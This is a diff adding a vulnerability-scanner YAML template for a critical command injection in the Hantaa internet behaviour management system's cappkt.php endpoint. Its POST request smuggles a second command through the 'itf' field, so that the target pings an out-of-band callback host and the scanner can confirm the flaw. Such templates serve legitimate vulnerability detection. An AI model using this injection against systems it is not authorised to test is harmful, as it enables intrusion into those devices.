@@ -1,0 +1,25 @@
+id: poc-yaml-antasys-ibms-cappkt-command-injection
+info:
+  name: 汉塔科技 上网行为管理系统 cappkt 命令注入漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: dnslog,command-injection
+
+variables:
+  reverse: "{{interactsh-url}}"
+
+http:
+  - raw:
+      - |
+        POST /dgn/dgn_tools/cappkt.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        itf=127.0.0.1;ping {{reverse}}; # &pktcnt=1&txtip=10
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
